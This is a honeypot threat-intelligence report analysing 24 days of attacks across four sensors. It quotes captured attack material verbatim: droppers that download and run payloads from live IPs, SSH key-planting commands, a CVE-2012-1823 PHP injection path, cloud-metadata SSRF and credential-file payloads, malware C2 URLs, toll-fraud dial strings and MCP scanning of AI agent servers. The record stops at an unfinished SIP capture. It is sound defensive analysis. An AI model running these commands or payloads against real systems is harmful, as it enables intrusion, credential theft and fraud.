# SESSION 30 — Full Threat Intelligence Analysis: 24 Days, Four Sensors

**Date:** 2026-09-15
**Box:** Hetzner Cloud VPS `ubuntu-4gb-hel1-2` (62.238.47.215)
**Window:** 2026-08-23 → 2026-09-15 (24 days)
**Continuity:** Follows `SESSION-29-beryl-repeater-5ghz-throughput-fix-2026-09-13.md`.
First comprehensive cross-sensor analysis of the full honeypot stack. Prior passes
covered single sensors in isolation (session 22 Dionaea deployment, session 26 disk
incident, session 27 one loader sample).

---

## 0. Corpus scope

| Sensor | Volume | Unique sources |
|---|---|---|
| **Cowrie** (SSH 22 / Telnet 23) | 416,703 events · 48,313 sessions · 95,508 commands | **4,669 IPs** |
| **Dionaea** (15 protocols) | ~76,300 real connections | ~1,900 IPs across protocols |
| **wp-honeypot** (HTTP 80) | 637 events | 70 IPs |
| **mailoney** (SMTP 25) | 517 sessions | **1 — see §6, sensor is broken** |

Cowrie payload captures: 1,694 download events → 75 unique files (1,619 duplicates),
104 files on disk, 1.2 GB.
Dionaea payload captures: 150 download events, 206 files on disk.

**Correction to raw Dionaea numbers:** the `connections` table reports 85,567, but
9,244 of those are `ftpdatalisten` — Dionaea *opening its own* passive-mode FTP data
sockets in response to the 2,132 real `ftpd` sessions. Confirmed via
`connection_type = 'listen'` and exactly one distinct remote host. **Real attacker
connection count is ~76,300.** Any figure quoting 85k is inflated by the sensor's own
sockets.

---

## 1. Cowrie — two distinct attacker populations

### Protocol split

```text
telnet  217,333
ssh     199,386
```

Telnet slightly exceeds SSH — consistent with IoT-device targeting rather than
server-focused attacks. **506 of 4,669 IPs (~11%) hit both protocols**, indicating
dual-protocol campaign tooling rather than single-vector scanners.

### Credentials — the key finding is *two* techniques, not one

```text
 12181  'root'            ''
  1009  'admin'           ''
  1008  'admin'           'admin'
   825  'root'            'vizxv'
   820  'root'            'xc3511'
   540  'user'            ''
   529  'ubuntu'          ''
   519  '345gs5662d34'    '345gs5662d34'
   495  'root'            '888888'
   421  'root'            'xmhdipc'
   419  'postgres'        ''
   404  'root'            'juantech'
   381  'oracle'          ''
   355  'git'             ''
   315  'root'            'anko'
```

**Population A — blank-password scanning.** `root`, `admin`, `user`, `ubuntu`,
`postgres`, `oracle`, `git`, `test` all with empty passwords. This is not password
guessing; it is mass scanning for *unauthenticated* access on misconfigured hosts.
The service-account names (`postgres`, `oracle`, `git`) indicate server targeting.

**Population B — Mirai's hardcoded credential table.** `vizxv`, `xc3511`, `xmhdipc`,
`juantech`, `anko`, `888888`, `54321` are the factory defaults for specific IoT
device vendors, lifted directly from Mirai's original brute-force list. Device
targeting, not server targeting.

Two different actor populations hitting the same box with structurally different
techniques.

### Honeypot-detection probe

`345gs5662d34 / 345gs5662d34` — 519 attempts. This is a deliberately absurd
credential pair used by scanners to *fingerprint honeypots*: a real system rejects
it; a permissive honeypot accepts it and reveals itself. **This box accepts it.**
Anyone running that check has flagged this sensor. Worth a config decision (§8).

### Login "success" rate is a configuration artifact, not a finding

```text
success  35,195
failed      474
```

Cowrie is configured to accept nearly any credential so attackers proceed to the
payload stage. **This must not be reported as "attackers succeeded 98% of the time."**

### Commands

```text
 11408  shell            <- Mirai/Gafgyt handshake probe (see session 20)
 11396  system
 11138  enable
 10467  sh
 10349  linuxshell
  6518  uname -a
  2113  c1=$(uname -s -v -n -r ...)
  1817  /bin/./uname -s -v -n -r -m
  1532  /bin/busybox UNSTABLE
   580  cd ~; chattr -ia .ssh; lockr -ia .ssh
   564  cd ~ && rm -rf .ssh && mkdir .ssh && echo ...
```

The top five remain the IoT botnet handshake sequence correctly identified as a
*phantom* in session 20 — these are not Linux commands and real bash rejects them
identically. The volume is real; the "gap" was not.

`chattr -ia .ssh; lockr -ia .ssh` (580) and the `rm -rf .ssh && mkdir .ssh && echo <key>`
pattern (564) are **persistence + anti-competition**: clear immutable flags, wipe any
existing authorized_keys, install their own, then re-lock the directory so rival
actors cannot do the same.

---

## 2. Payload infrastructure

### Hosting servers, ranked

```text
242  185.93.89.72        <- also a top-20 ATTACKER IP
171  2.26.136.128
 50  176.65.139.235
 15  131.123.40.104
 14  94.154.43.192
 14  5.182.210.174
  8  176.65.139.196
  8  176.65.139.136
  2  2.27.248.13         <- session 27's loader C2
```

**`185.93.89.72` serves both roles** — it appears in the top-20 attacker IPs *and* is
the single largest payload host, serving `mirai.arm7`, `mirai.arm`, `mirai.mips`,
`mirai.mpsl`. Self-contained scan-and-infect infrastructure on one box, named
transparently.

`google.com`, `icanhazip.com`, `cloudflare.com/cdn-cgi/trace`, `ipinfo.io` also appear
— these are **connectivity/IP-reflection checks**, not payload fetches. Malware
confirming it has internet access and discovering its own public IP.

### Captured payload architecture spread

```text
17  Bourne-Again shell script
 8  ELF 64-bit LSB x86-64 (dynamic)
 4  ELF 32-bit LSB ARM (static)
 3  ELF 64-bit LSB x86-64 (static)
 3  ELF 32-bit MSB MIPS
 3  ELF 32-bit LSB MIPS
 2  ELF 64-bit LSB ARM aarch64
 2  ELF 32-bit LSB Intel i386
```

ARM (32-bit and aarch64), MIPS (both endiannesses), i386, x86-64 — the standard
multi-architecture Mirai build set, matching the loader dissected in session 27.

### Two distinct delivery models

**Shared static binaries** — `185.93.89.72` serves the same named files
(`mirai.arm7`) to everyone.

**Per-target unique payloads** — `5.182.210.174` serves dozens of short random-hex
filenames, each fetched, `chmod 777`'d, executed with the argument `bc`, then
immediately deleted:

```bash
wget http://5.182.210.174/7c2f5b; curl -O http://5.182.210.174/7c2f5b
chmod 777 7c2f5b; ./7c2f5b bc; rm -rf 7c2f5b; rm -rf 7c2f5b.1
```

Repeated for `5948a2`, `238548`, `e96888`, `fad27a`, `03099c`, `be2f34`, `7fc7fe`,
`8aa152`, `f06b36`… Unique-filename-per-delivery defeats naive hash-blocklisting and
makes the traffic harder to fingerprint.

---

## 3. Botnet turf warfare — captured live

Two captured scripts are not droppers at all. They are **competitor-eviction tools**.

**Generic self-hiding-malware killer:**

```sh
#!/bin/sh
for proc_dir in /proc/*; do
    pid=${proc_dir##*/}
    result=$(ls -l "/proc/$pid/exe" 2> /dev/null)
    if [ "$result" != "${result%(deleted)}" ]; then
        kill -9 "$pid"
    fi
done
```

It kills any process whose `/proc/$pid/exe` symlink resolves to `(deleted)` — i.e.
any binary that unlinked itself from disk after launching. That is the classic
malware self-concealment technique, so this script is a heuristic for "kill everything
hiding like malware, regardless of family." It is killing *other actors' implants*.

**Targeted rival killer:**

```sh
cmdline=$(tr '\0' ' ' < /proc/$pid/cmdline 2> /dev/null)
if echo "$cmdline" | grep -q "dvrHelper"; then
    kill -9 "$pid"
fi
```

`dvrHelper` is a known Mirai-variant process name. This one hunts a *specific named
rival family*.

Together with the 580 `lockr -ia .ssh` lockout commands, this is a coherent picture:
compromised IoT hosts are a contested resource, and these actors actively evict each
other.

---

## 4. A notably better-engineered dropper (Chinese-language)

```sh
#!/bin/sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
# 清理旧文件                          ("clean up old files")
rm -f x*
get() {
    wget -q -O x "http://198.144.179.82:80/$1" 2>/dev/null \
      || busybox wget -q -O x "http://198.144.179.82:80/$1" 2>/dev/null \
      || curl -fsso x "http://198.144.179.82:80/$1" 2>/dev/null
    [ -s x ]
}
# 架构检测: 优先 uname -m, 无 uname 的老设备用 /proc/
```

Distinguishing features versus the commodity droppers: a writable-directory fallback
chain, a triple-downloader fallback (`wget` → `busybox wget` → `curl`), an explicit
empty-file check (`[ -s x ]`), and — per the comment — an architecture-detection
fallback via `/proc` for devices too old to have `uname`. Materially more defensive
engineering than the `wget || curl` one-liners elsewhere in the corpus.

---

## 5. Dionaea — an entirely separate threat ecosystem

### Protocol distribution (real connections, `ftpdatalisten` excluded)

```text
smbd     38,222   668 IPs
SipSession 9,663  519 IPs
httpd     8,262   690 IPs
SipCall   5,389    42 IPs
mssqld    4,250   345 IPs
mysqld    3,942   383 IPs
pptpd     2,756   156 IPs
ftpd      2,132   312 IPs
Memcache    707   211 IPs
mqttd       390   143 IPs
epmapper    350   183 IPs
upnpd       247   121 IPs
```

### Captured binaries are Windows, not Linux

```text
77  PE32 executable for MS Windows (DLL), Intel
84  JSON text data
27  ASCII text
```

**Dionaea's captures are Windows PE32 DLLs.** Cowrie's are ARM/MIPS/x86 Linux ELF.
Two completely separate threat ecosystems arriving at the same IP simultaneously:
SMB/Windows exploitation versus IoT/Linux botnet recruitment. This is the strongest
single argument for running multiple honeypot types rather than one.

### The PE32 samples are WannaCry — positively identified

75 of the 77 PE32 files are **exactly 5,267,459 bytes**. Strings confirm the family
beyond doubt:

```text
mssecsvc.exe          <- WannaCry's service binary
mssecsvr.exe          <- minor variant spelling, same family
launcher.dll          <- embedded payload component
tasksche.exe          <- the WannaCry encryptor
CreateProcessA, WININET.dll, iphlpapi.dll, MSVCRT.dll
```

And the decisive one — the kill-switch domain:

```text
http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
```

That is the exact sinkhole domain registered by Marcus Hutchins in May 2017 to halt
the global WannaCry outbreak. Its presence, alongside `tasksche.exe` and
`mssecsvc.exe`, is conclusive.

**WannaCry is still propagating via EternalBlue over SMB in 2026** — nearly a decade
after the outbreak — and this sensor captured 75 samples of it in 24 days. This is
what the 38,222 SMB connections (668 distinct IPs, the single largest protocol
category) actually represent: a still-running worm hitting every reachable host with
port 445 open. The `mssecsvc` / `mssecsvr` spelling split indicates at least two
minor variants in circulation.

94 distinct MD5s across the 206 files total, so the corpus holds more than just this
one family, but WannaCry dominates it.

> **This is the single strongest artifact in the corpus for portfolio purposes** — a
> positively-identified, historically significant ransomware worm, captured live on a
> self-built sensor, confirmed by kill-switch domain rather than by hash lookup.

### The 84 JSON captures are cloud-credential attacks and AI-agent scanning

Not malware at all. Dionaea's HTTP module stored the raw request bodies. Three
distinct attack classes:

**1. AWS metadata SSRF — IAM credential theft**

```json
{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
{"uri":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
{"target":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

`169.254.169.254` is the EC2 link-local metadata service; reaching it from a
server-side request handler returns live temporary IAM credentials. This is the exact
technique behind the Capital One breach. **Three different JSON field names
(`url`/`uri`/`target`) indicate at least three distinct scanning tools** probing the
same weakness.

Paired local-file-inclusion attempts targeting the same goal:

```json
{"url":"file:///proc/self/environ"}
{"url":"file:///root/.aws/credentials"}
```

**2. GraphQL introspection**

```json
{"query":"{ __typename }"}
{"query":"{ __schema { types { name fields { name } } } }"}
{"query":"{ __schema { types { name fields { name args { name defaultValue } } } } }"}
```

Escalating specificity — a cheap `__typename` probe to confirm a GraphQL endpoint
exists, then full schema dumps to enumerate every type, field, and argument for
attack planning.

**3. MCP (Model Context Protocol) scanning — a brand-new attack surface**

```json
{"jsonrpc":"2.0","id":7321371,"method":"initialize","params":{
  "protocolVersion":"2025-06-18",
  "capabilities":{"sampling":{},"elicitation":{},"roots":{"listChanged":true}},
  "clientInfo":{"name":"internet…"}}}
```

These are MCP `initialize` handshakes — **someone is mass-scanning the internet for
exposed AI agent servers.** The `protocolVersion` is dated 2025-06-18 and the
`clientInfo.name` begins "internet…" (truncated in capture; plausibly a research
scanner such as internet-measurement.com rather than a malicious actor). Either way,
this is reconnaissance against an attack surface that barely existed a year ago,
captured incidentally by a general-purpose honeypot.

### HTTP scanning originates from cloud providers, not IoT

```text
35.240.101.227  675     34.24.248.176   583
8.228.17.47     675     136.110.65.58   534
136.70.75.212   674     34.21.89.109    490
207.175.114.99  643     35.201.174.76   112
```

The `34.*` / `35.*` ranges are Google Cloud; others are AWS. Request counts cluster
tightly around 675 per host — an evenly-distributed, coordinated scanning fleet on
rented cloud infrastructure, structurally different from the compromised-device
population hitting Cowrie.

### SIP / VoIP — 8,482 commands, never previously examined

```text
INVITE     5,387
REGISTER   2,731
OPTIONS      204
ACK          166
```

INVITE-dominant (not REGISTER-dominant) indicates **direct toll-fraud call attempts**
rather than mere registration probing — attackers trying to place calls through the
PBX, typically to premium-rate numbers.

User agents:

```text
VOIP                              2,587
pplsip                            1,612
Cisco-SIPGateway                  1,554
Asterisk PBX                        737
PolycomVVX-VVX_450-UA/6.4.3.5059    692
Linksys-SPA942                      269
friendly-scanner                    143
FPBX-15.0.17                         94
SIP-T21P_E2/34.80.0.40               17
```

`friendly-scanner` is SIPVicious, the standard VoIP audit tool — the only one
announcing itself honestly. The rest **spoof legitimate hardware identities**
(Polycom desk phones, Linksys ATAs, Cisco gateways, Asterisk/FreePBX servers) to
blend in with normal PBX traffic. Two IPs — `74.50.96.122` and `148.66.153.237` —
each generated ~1,400+ paired SipCall/SipSession events.

**Schema limitation — with a workaround.** `sip_commands` stores only method,
call-id, user-agent, and allow, so the dialed numbers are absent from the database.
**They were recovered from the raw bistreams instead (§7d)** — the structured tables
were the wrong source, not the end of the road.

### Dionaea credentials

```text
root|(blank)|1120
admin|(blank)|831
sa|(blank)|512
sa|123456|52
sa|!QAZ2wsx|40
anonymous|anonymous@|27
anonymous|IEUser@|21
```

Same blank-password pattern as Cowrie. `sa` (SQL Server's default admin) dominates
the non-blank attempts, consistent with 4,250 MSSQL connections. `IEUser@` is the
default username on Microsoft's free IE-testing VMs — its presence in a wordlist
indicates a list built against exposed Windows test environments.

---

## 6. Cross-sensor correlation — the strongest finding

The wp-honeypot captured five POST bodies containing
`<?php shell_exec(base64_decode(...`. One example:

```text
IP:   160.250.132.238
Path: /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
```

That path is **CVE-2012-1823**, the PHP-CGI argument-injection vulnerability — the
`%ADd` sequences smuggle `-d` php.ini directives through the query string to force
`php://input` execution.

Decoding the base64 body yields:

```sh
cd /tmp || cd /var/tmp || cd /dev/shm
echo '-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg...
```

**That key material is byte-identical to the SSH key fragments captured in Cowrie's
sessions** (visible in the session-20 command-frequency analysis as the base64 chunks
beginning `b3BlbnNzaC1rZXktdjEA` and `QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg`).

**The same actor, using the same SSH public key, attacked over both SSH/Telnet and
HTTP.** Two different protocols, two independently-built honeypots, one attributable
campaign. This is exactly the correlation value that motivated running a multi-sensor
stack, and it would have been invisible looking at either sensor alone.

### wp-honeypot's actual traffic is `.env` hunting, not WordPress

```text
71  /
 5  /wp-admin/
 4  /.env
 3  /www/.env, /web/.env, /v3/.env, /v2/.env, /uploads/.env,
    /test/.env, /system/.env, /static/.env, /staging/.env,
    /stage/.env, /src/.env, /settings/.env, /services/.env
 3  /twilio/.env.php, /twilio.env, /var/.env.local.php
 4  /SDK/webLanguage
```

Only 5 requests touched `/wp-admin/`. The dominant pattern is **mass enumeration for
leaked `.env` files** across dozens of directory variants — these contain API keys,
database credentials, and cloud tokens in typical deployments. `/twilio/.env.php`
specifically targets Twilio credentials (SMS/voice API abuse — note the thematic link
to the SIP toll-fraud traffic). `/SDK/webLanguage` is a known IP-camera RCE path.

This also updates session 22's finding: that pass observed Vite dev-server probing on
this sensor; over a longer window, `.env` enumeration is the dominant behavior.

---

## 7. Mailoney is a broken sensor — no usable data in 24 days

```text
distinct source IPs: 1
   ('127.0.0.1', 517)
credentials rows: 0
```

**All 517 sessions record `127.0.0.1` as the source IP.** The iptables NAT redirect
(`-A PREROUTING -p tcp --dport 25 -j REDIRECT --to-ports 12525`) rewrites the
destination, and mailoney binds to `127.0.0.1:12525`, so it only ever observes the
loopback address. **Every real attacker IP for the entire 24-day window is
unrecoverable** — it was never recorded.

The `credentials` table is empty: zero AUTH attempts captured. Sample session data
shows only the banner and timeout exchanges:

```json
[{"direction": "out", "data": "220 app-prod-01 ESMTP Service Ready\n"},
 {"direction": "out", "data": "421 4.4.2 Connection timed out\n"}]
```

Connections arrive, receive the banner, and time out without authenticating. Prior
sessions cited "517 sessions" as evidence mailoney was working. It is running, but it
is not producing usable intelligence.

---

## 7b. Second-pass findings — infrastructure, timing, and sessions

### Hosting-provider concentration: these are rented servers, not IoT devices

Reverse DNS on the top 30 Cowrie sources:

```text
43555  92.204.138.187   <no PTR>
29888  208.109.242.255  255.242.109.208.host.secureserver.net
24284  160.153.175.11   11.175.153.160.host.secureserver.net
23559  77.42.80.164     static.164.80.42.77.clients.your-server.de
17990  103.134.26.228   ASSIGNED-FOR-CLIENT.mimebd.com
10135  188.166.223.22   droplet-mahaputra.id
 8941  132.148.73.100   100.73.148.132.host.secureserver.net
 7528  132.148.148.91   91.148.148.132.host.secureserver.net
 6102  166.62.41.96     96.41.62.166.host.secureserver.net
 4608  131.123.40.104   swiftc2
 3140  216.70.97.74     www.floridacollege.edu
 3138  44.252.91.203    ec2-44-252-91-203.us-west-2.compute.amazonaws.com
 4914  143.198.208.150  bostonpda.org
```

**`secureserver.net` is GoDaddy** — six IPs in the top 30, roughly **80,000 events
from GoDaddy-hosted infrastructure alone.** `your-server.de` is Hetzner (the same
provider hosting this honeypot). Plus DigitalOcean droplets and an AWS EC2 instance.

These are **rented cloud servers**, not compromised consumer devices — a materially
different actor profile from the Mirai-credential population in §1, and one that
implies either abuse of free-tier/trial accounts or use of stolen payment methods.

**`131.123.40.104` has a PTR record of literally `swiftc2`** — an operator who named
their own command-and-control server in reverse DNS. It is also a payload host
(`bins.sh`, `tftp1.sh`). Self-identified C2 infrastructure.

**`mimebd.com` operates four sequential IPs** (`103.134.26.228/229/230/231`)
totalling ~31,000 events — a coordinated block, not independent hosts.

**Two compromised legitimate sites:** `floridacollege.edu` (3,140 events) and
`bostonpda.org` (4,914) are almost certainly hacked and repurposed as scanning
infrastructure rather than intentional attackers — worth noting as victims, not
adversaries.

### swiftc2's technique, in full

All 144 iterations identical — a fully automated **writable-directory probe**:

```sh
>/tmp/.ptmx     && cd /tmp/
>/var/tmp/.ptmx && cd /var/tmp/
>/dev/shm/.ptmx && cd /dev/shm/
>/var/run/.ptmx && cd /var/run/
>/var/.ptmx     && cd /var/
>/usr/.ptmx     && cd /usr/
>/etc/.ptmx     && cd /etc/
>/mnt/.ptmx     && cd /mnt/
rm -rf lzrd oxdedfgt
cp /bin/busybox lzrd
chmod 777 lzrd
```

`>file` creates an empty file; success chains into `cd` via `&&`. Eight candidate
directories are tested to find any writable location. `.ptmx` mimics a legitimate
device-file name. Then `cp /bin/busybox lzrd` — copying the system's own busybox
under a new name, a living-off-the-land technique that avoids downloading anything
detectable. **`lzrd` is a known Gafgyt/Bashlite variant string**, matching the
`/bin/busybox LZRD` commands seen 271 times elsewhere in the corpus.

### Campaign bursts are single-actor events

```text
2026-09-01   70,814 events   <- 5x baseline
2026-09-06   48,278 events   <- 3.5x baseline
baseline     ~9,000–15,000/day
```

**Sept 1:** `208.109.242.255` (29,888) + `160.153.175.11` (24,284) — both GoDaddy —
account for 54k of 70k events.
**Sept 6:** `92.204.138.187` alone accounts for 32,223 of 48,278.

Not distributed campaigns; individual rented hosts hammering a single target. Command
content in both bursts was the standard IoT handshake sequence — high volume, low
sophistication.

### Diurnal pattern

```text
19:00  32,220   (peak)
23:00  26,967
18:00  25,797
17:00  24,774
22:00  24,077
00:00  22,547
...
10:00  10,756   (trough)
04:00  11,220
```

Roughly 3x variation between peak (17:00–23:00 UTC) and trough (03:00–12:00 UTC).
Consistent with scanning infrastructure concentrated in a particular set of
timezones rather than truly global round-the-clock distribution.

### Actor overlap by protocol

```text
ssh-only     2,587
telnet-only  1,578
both           506
```

Largely separate populations — only ~11% of sources run dual-protocol campaigns.

### Session-level: 1,655 TTY recordings, 220 MB

Full keystroke-by-keystroke replays exist for every interactive session
(`var/lib/cowrie/tty/`, replayable via `src/cowrie/scripts/playlog.py`). Two outliers
explained:

**74 MB from a single 6-character command.** Session `05d6afc2ec75`
(`207.90.192.61`) ran `find /` — which recursively printed the entire fake
filesystem. Incidentally, this is direct evidence the decoys present convincingly:
the output includes `/root/credentials_dump.json`,
`/root/customer_list_private.csv`, `/root/api_credentials_dump.json`, `/root/.aws`,
`/root/.secrets`, `/opt/app/.env`, `/opt/app/config/.env`,
`/opt/app/docker-compose.yml`.

**86 MB across 15 sessions from `37.120.177.10` — a human operator.** Logged in as
`sad` (not a botnet credential), browsed by hand (`cd ..`, `ls`, typos like `htopo`
and retrying `ss` after `sudo ss -lntup` failed), read planted decoy files in
sequence, and paused **109 seconds** after opening `who_is_this.txt` before acting
again. Later sessions attempted `cat /home/acampbell/.bash_history`,
`cat /var/www/html/wp-config.php`, `tail -f /var/log/nginx/access.log`, and a PHP
one-liner attempting a live `mysqli` connection using credentials
(`wp_appprod`) harvested from the fake `wp-config.php`.

**Reusable tooling fingerprint:** parallel sessions repeatedly issued
`echo $$;ps -eo tty,pid,ppid,etime,args` and
`while true; do sleep 1; head -v -n 8 /proc/meminfo; …` — these are the built-in
resource-monitor panels of GUI SSH clients (Termius / MobaXterm class). **Their
presence is a reliable indicator of a human on a graphical client rather than a
script.**

### The 690 MB file and the MP4s — bandwidth abuse, not malware

`tmp_290ordr` (690,503,425 bytes, `data`) is an incomplete download. The two
completed files carry `ftypisom / iso2 / avc1 / mp41` headers — genuine MP4 video.
The honeypot was being used as free bandwidth/storage for media transfer, not
attacked. Worth a size cap on Cowrie downloads (§8) — this single file was a
meaningful contributor to the disk pressure investigated in session 26.



## 7c. Third-pass findings — RPC, tool attribution, and second-stage IOCs

### DCERPC: the SMB attack chain, and a correction

```text
uuid                                  opnum  count  service
1ff70682-0a51-30e8-076d-740be8cee98b    0     167   ATSVC (task scheduler)
e1af8308-5d1f-11c9-91a4-08002b14a0fa    2      36   epmapper
4b324fc8-1670-01d3-1278-5a47bf6ee188   31       4   SRVSVC
4b324fc8-1670-01d3-1278-5a47bf6ee188   16       4   SRVSVC
4b324fc8-1670-01d3-1278-5a47bf6ee188   15       2   SRVSVC
```

`4b324fc8-1670-01d3-1278-5a47bf6ee188` is **SRVSVC** — the interface EternalBlue
(MS17-010) targets, and the path WannaCry uses to propagate.

**Correction worth making explicitly:** only **10 SRVSVC requests from 3 IPs** appear
in 24 days, against 75 captured WannaCry samples. The exploitation attempts are far
rarer than the payload count implies, and none of the WannaCry MD5s appear in the
`downloads` table — those samples arrived via SMB directly, not the HTTP/FTP download
path. The initial read of "the attack chain matching the payloads" overstated the
correlation; the two datasets are related by family but are not linked
request-to-payload in this corpus.

**The genuinely notable actor is `203.239.130.38`** — 167 ATSVC calls (remote
scheduled-task creation, a persistence and lateral-movement technique), plus 2 of the
10 SRVSVC requests. Profile:

```text
smbd connections: 175
credentials captured: 0          <- skipped auth entirely, straight to RPC
active window: ~2.8 hours (single burst, not persistent scanning)
```

Zero login attempts is itself the finding: this actor did not brute-force, it went
directly to RPC exploitation. Focused and deliberate, unlike the commodity scanning
that dominates the rest of the corpus.

### MSSQL client fingerprints — three distinct tool populations

```text
appname                        client library              count
Microl office                  ODBC                         178
pymssql=2.1.4                  DB-Library                   162
Nmap NSE                       mssql.lua                      4
OSQL-32                        ODBC                           2
go-mssqldb                     go-mssqldb                     2
.Net SqlClient Data Provider   .Net SqlClient Data Provider    1
<random 10-char>               OLEDB                       1 each
```

**`Microl office` is a misspelling of "Microsoft Office" hardcoded into a scanning
tool** — which makes it a durable, reliable fingerprint for that tool family.

**`pymssql=2.1.4` (162) is nearly as prevalent** — a Python library, indicating
custom-written tooling rather than an off-the-shelf scanner. This was missed in the
first pass and materially changes the picture: roughly half this traffic is bespoke.

Hostnames tell the same story:

```text
SD-20240408NDEW   81
zbxx01            81      <- identical count: one operator, paired infrastructure
SERVER            17
Nmap               4
EC2AMAZ-FOUU0LR    -      <- default AWS Windows hostname: a compromised EC2 instance
FUWUQI             -      <- Pinyin for 服务器 ("server")
```

`SD-20240408NDEW` and `zbxx01` at exactly 81 each is almost certainly a single
operator running two hosts. `FUWUQI` and `zbxx01` both suggest Chinese-origin
tooling, consistent with the Chinese-language dropper in §4.

The random 10-character appname/hostname pairs (`opbff3d8xa` / `j4jb7j5wd1`) are
**deliberate randomization specifically to defeat this kind of fingerprinting** — an
actor who knows these fields are logged.

### The two non-WannaCry samples — both second-stage IOCs

Of 77 PE32 files, 75 are WannaCry (5,267,459 bytes). The other two are distinct
families, both ~82 KB:

**`70ccd9220cebb56eaa38b9f1bd1a1cd8` — Monero cryptominer**

```text
C:\Windows\System32\sys.exe
http://sm.monerorx.com:8800/888888
KERNEL32.dll, WININET.dll
```

`monerorx.com` is a known Monero mining pool. Classic SMB-worm-to-cryptominer
monetisation.

**`ca71f8a79f8ed255bf03679504813c6a` — staged downloader**

```text
c:\windows\system32\cmd.exe
http://down.0814ok.info:8888/ok.txt
HttpOpenRequestA, HttpSendRequestA, WININET.dll, ole32.dll
```

Fetches a second stage from a plain text file and executes via `cmd.exe`.

Both C2 endpoints — `sm.monerorx.com:8800` and `down.0814ok.info:8888` — are
submittable IOCs.

### Dionaea HTTP request paths — systematic multi-cloud SSRF

Extracted from the raw bistreams (67,811 stored connection dumps; 7,600 are `httpd`).
The JSON bodies in §5 showed the payloads; the paths show the delivery:

```text
62  GET /
16  GET /favicon.ico
 4  GET /config.json
 3  GET /admin/config.php
 3  GET /.git/config
 3  GET /.env
 2  GET /proxy?url=http%3A%2F%2F169.254.169.254%2Fmetadata%2Fidentity     <- AZURE
 2  GET /fetch?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%     <- AWS
 2  GET /api/download?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmet     <- AWS
 2  GET /actuator/heapdump
 2  GET /wp-config.php.bak
 2  GET /docker-compose.yml
 2  GET /swagger.json
 2  GET /geoserver/web/
 2  POST /proxy
 2  POST /fetch
```

**Three different proxy-parameter names (`/proxy`, `/fetch`, `/api/download`) against
both AWS *and* Azure metadata endpoints.** The Azure variant
(`169.254.169.254/metadata/identity`) did not appear in the JSON body captures at all
— it was only visible in the URL paths. This is a more systematic credential-theft
campaign than the first pass suggested.

`/actuator/heapdump` is a Spring Boot endpoint that dumps process memory — frequently
leaking credentials and tokens. `/.git/config`, `/wp-config.php.bak`,
`/docker-compose.yml`, and `/swagger.json` are all config/secret exposure probes.

**Realism defect noted:** Dionaea's HTTP module answers on 443 with
`Server: nginx` while serving a Python `SimpleHTTPServer`-style directory listing
(`<title>Directory listing for /</title>`). Real nginx never produces that markup —
a trivially detectable honeypot tell.

### PPTP, epmapper, and the small protocols

```text
pptpd   213.209.159.136   2,333    <- 85% of all PPTP traffic from ONE host
pptpd   194.50.16.198        87
epmapper 172.234.162.31       40
epmapper 172.238.126.119      30
mirrord/mirrorc 35.203.211.173 21 each
```

`213.209.159.136` alone accounts for 2,333 of 2,756 PPTP connections. VPN-endpoint
scanning concentrated almost entirely in a single actor.

### wp-honeypot user agents — a session-20 callback

```text
213  Mozilla/5.0 (X11; U; Linux x86_64) … Ubuntu/10.10 Chromium/10.0.648.133
114  Mozilla/5.0 (X11; U; Linux x86_64) … Chrome/4.0.222.5
114  Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G930T) … SamsungBrowser/6.4
 47  libredtail-http
 13  python-requests/2.27.1
 13  Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)
  8  Mozilla/5.0 (compatible; Infrawatch/1.0; +https://infrawat.ch/)
  8  Go-http-client/1.1
  7  Farez-Sorter/1.0
  6  Mozilla/5.0 (compatible; KeyScanner/1.0)
```

**`libredtail-http` (47) connects directly to the `redtail_bot` finding from session
20** — the same actor family is still active against this box weeks later, now
visible on a different sensor.

The top three agents are stale spoofs — Chromium 10 and Chrome 4 are from 2010 and
2009 respectively. No real browser sends these; they are hardcoded strings in
scanning tools. `GenomeCrawlerd` (Nokia) and `Infrawatch` are legitimate,
self-identifying research crawlers.

## 7d. Fourth pass — raw bistream analysis

67,811 raw per-connection dumps sit under `var/lib/dionaea/bistreams/`, dated from
2026-08-31 onward. Each is a Python-literal `stream = [('in', b'…'), ('out', b'…')]`
capture of both directions of a connection.

```text
smbd        37,224      ftpd         2,236
SipSession   8,789      Memcache       527
httpd        7,601      mqttd          367
mssqld       4,177      epmapper       301
mysqld       3,945      upnpd          248
pptpd        2,743
```

### SIP toll-fraud destinations — recovered, correcting §5

The numbers §5 reported as unrecoverable were in the raw streams all along:

```text
 40  +390237902850          Italy (+39), Milan (02)
 36  00390237902850         same number, 00 international prefix
 26  00442039962635         UK (+44), London (020)
 16  10000                  internal extension probe
  8  12768216212            +1 276/268 — Caribbean premium-rate range
  8  012768216212
  8  001112768216212
  6  01148422032120         011 (US intl prefix) + 48 = Poland
  6  00948422032120
  4  6300442039962635       prefix-stripping test on the UK number
  4  3600442039962635       same, different prefix
  2  999625400390237902001
  2  9994798600390237902001
  2  99390237902001
  2  98885                  internal extension probe
```

Three distinct techniques in one dataset:

**1. Premium-rate destinations.** Italian and UK numbers dominate. `+1 276…` sits
inside the North American numbering plan, but the adjacent +1 268 range is Antigua
and Barbuda — a classic toll-fraud target precisely because it bills as
international while *looking* domestic to US-based systems.

**2. Dial-plan prefix probing.** `999625400390237902001`,
`9994798600390237902001`, `99390237902001` are the same Italian number carrying
escalating junk prefixes. The attacker is testing whether the PBX strips leading
digits (`9` for an outside line, then `999`, `9994798`, `63`, `36`) before routing —
hunting a dial-plan misconfiguration that lets the call out.

**3. Extension enumeration.** `10000`, `98885`, `user`, `test.echo`, `carol` —
probing for internal extensions and default SIP accounts.

A complete captured INVITE:

```text
